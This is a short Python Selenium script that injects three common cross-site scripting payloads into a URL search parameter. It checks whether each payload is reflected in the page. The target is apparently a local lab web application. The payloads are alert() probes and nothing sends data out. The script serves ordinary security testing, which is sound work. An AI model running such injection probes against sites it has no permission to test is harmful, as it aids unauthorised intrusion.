from selenium import webdriver
import time


################################################################
#
# TESTING
#
################################################################

# List of common XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "'\"><svg onload=alert(111)>"
]

# Initialize the browser (e.g., Chrome)
browser = webdriver.Chrome()

# Function to inject XSS payloads into URL parameters
def test_xss_url(base_url, param_name):
    for payload in xss_payloads:
        # Construct the vulnerable URL by injecting payload into the parameter
        vulnerable_url = f"{base_url}{param_name}={payload}"
        
        # Open the URL in the browser
        print(f"Testing URL: {vulnerable_url}")
        browser.get(vulnerable_url)
        
        # Wait for the page to load
        time.sleep(2)
        
        # Check if the payload is reflected in the page source
        page_source = browser.page_source
        if payload in page_source:
            print(f"Potential XSS vulnerability detected with payload: {payload}")
        else:
            print(f"Payload {payload} not reflected.")

# Example usage:
base_url = "http://192.168.12.146:3000/#/search?q="
test_xss_url(base_url, "q")

# Close the browser when done
browser.quit()
